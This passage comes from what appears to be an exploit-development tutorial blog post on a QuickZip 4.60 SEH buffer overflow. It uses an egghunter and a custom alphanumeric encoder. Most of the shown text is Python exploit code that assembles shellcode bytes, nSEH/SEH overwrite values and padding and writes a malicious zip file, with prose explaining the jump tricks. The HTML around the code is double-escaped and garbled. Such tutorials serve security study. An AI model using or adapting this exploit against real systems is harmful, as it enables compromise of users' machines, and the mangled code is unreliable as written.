</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x54</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push esp;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x58</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x2d</span>\<span class="n">x07</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x0101072D</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2d</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># sub eax, 0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x5c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># pop esp;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Write</span> <span class="n">instructions</span> <span class="k">for</span><span class="p">:</span> <span class="n">push</span> <span class="n">esp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">eax</span><span class="p">;</span> <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xDEADBEEF</span><span class="p">;</span> <span class="n">jmp</span> <span class="n">eax</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0x909090e0 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x70</span>\<span class="n">x70</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x70707070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x70</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x20202070</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xffdeadbe into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x77</span>\<span class="n">x77</span>\<span class="n">x77</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77777777</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x37</span>\<span class="n">x25</span>\<span class="n">x57</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77572537</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x10</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x11</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x11101110</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;</span>
</span><span class='line'>                                    <span class="c"># Zero-out EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x01010101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x25</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># and eax,0x10101010</span>
</span><span class='line'>                                       <span class="c"># write 0xef2d5854 into EAX</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x43</span>\<span class="n">x47</span>\<span class="n">x1c</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x771c4743</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x01</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x77011010</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x05</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x10</span>\<span class="n">x01</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># add eax, 0x01100101</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># push eax;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>   <span class="c"># padding for the rest of encoder&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x71</span>\<span class="n">x9b</span>\<span class="n">x70</span>\<span class="n">x9b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># nSEH: jno $-99; jo $-99   =&gt; &amp;lsquo;9b&amp;rsquo; will actually be converted to &amp;lsquo;a2&amp;rsquo;, which is $-92</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x33</span>\<span class="n">x28</span>\<span class="n">x42</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># SEH&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Length</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">mefile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cst</span><span class="o">.</span><span class="n">zip</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">complete</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>And that&rsquo;s how it looks after execution:</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written%20instructions.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written%20instructions.png" alt="image" /></a></p>

<p>Fantastic, we have successfully written code that we want using only valid characters! All that&rsquo;s left to do now is to jump back to that area to get it executed. We&rsquo;ll also need to change our temporary <code>0xDEADBEEF</code> address that we have written to the actual offset once we know what it is&hellip; but that&rsquo;s at the end.</p>

<h2>Jumping around</h2>

<p>Unfortunately we don&rsquo;t have much space to jump around. Only <strong>5</strong> bytes after our custom encoder code and <strong>4</strong> bytes before the encoder code. We need to come up with instructions that will get us to the code we have just written.</p>

<p>Turns out, there&rsquo;s actually not much that we can do due to the character restriction. Any short backward jumps contain invalid characters and don&rsquo;t get us where we need to be. Also, if we were to reuse the jump we took before&hellip; hang on&hellip; the jump we used before&hellip;. hmmmm.</p>

<p>Have a look at the payload we currently have.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written%20instructions.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written%20instructions.png" alt="image" /></a></p>

<p>We need to get creative. Let&rsquo;s reuse the <code>JNO</code> jump back we already have in our SEH to put us back again in the area we control. At the very beginning of the encoder payload that we currently have, we&rsquo;ll add some NOPs that will be then overwritten with another jump back instruction by our custom encoder to put us before the code we have just recently written.</p>

<p>Phew, hope it makes sense? Let me explain.</p>

<p>The jump we&rsquo;ll need to use will be simply <code>JMP $-16</code> (<code>\xeb\xee</code>), unfortunately it contains invalid characters and it won&rsquo;t work for us&hellip;. any jump with valid characters will put us too far &lsquo;up&rsquo;.</p>

<p>However! We can write it using the encoder we already have, exactly the same way we&rsquo;ve done it for putting address of egghunter to <code>EAX</code> - we&rsquo;ll just need to adjust our offsets and modify code a little bit.</p>

<p>First of all, instead of those few NOPs that we were writing using our encoder, we&rsquo;ll add our <code>JMP</code> instruction. Secondly, we&rsquo;ll need to modify our initial stack adjustment to land exactly where the SEH jump will initialy take us. Lastly, we&rsquo;ll add some NOPs that will be overwritten at the very beginning of the encoder. A lot to take in, but let&rsquo;s see how it works in action - hopefully it&rsquo;ll be clearer.</p>

<p>Let&rsquo;s start with NOPs before our custom encoder. Since we need to use valid character set, we can use <code>\x41\x41</code> (<code>INC ECX</code>) as our NOPs.</p>

<p>Next, stack adjustment. Looking at current state, it appears that we&rsquo;ll need to offset it <strong>6</strong> bytes further to start writing into the area we want to overwrite. Let&rsquo;s make that change as well.</p>

<p>Lastly, we&rsquo;ll need to write the <code>JNZ $-16</code> (<code>\x75\xee</code>) instruction with our encoder. Let&rsquo;s just replace last two <code>\x90</code> with the new instruction (remembering about little-endianness and that we need to write it in reverse).</p>

<p>Putting it all together, the changes should look like this:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="n">snip</span><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">nseh_offset</span> <span class="o">=</span> <span class="mi">292</span>
</span><span class='line'><span class="n">jump_offset</span> <span class="o">=</span> <span class="mi">92</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="n">snip</span><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="n">egghunter</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="n">jump_offset</span><span class="p">)</span>    <span class="c"># padding for nSEH&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x41</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>   <span class="c"># INC ECX (acts as NOPs, but using valid character set)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Offset</span> <span class="n">the</span> <span class="n">stack</span> <span class="n">by</span> <span class="mh">0x632</span> <span class="n">to</span> <span class="n">start</span> <span class="n">writing</span> <span class="n">to</span> <span class="n">a</span> <span class="n">controlled</span> <span class="n">area</span> <span class="n">of</span> <span class="n">memory</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#</span>
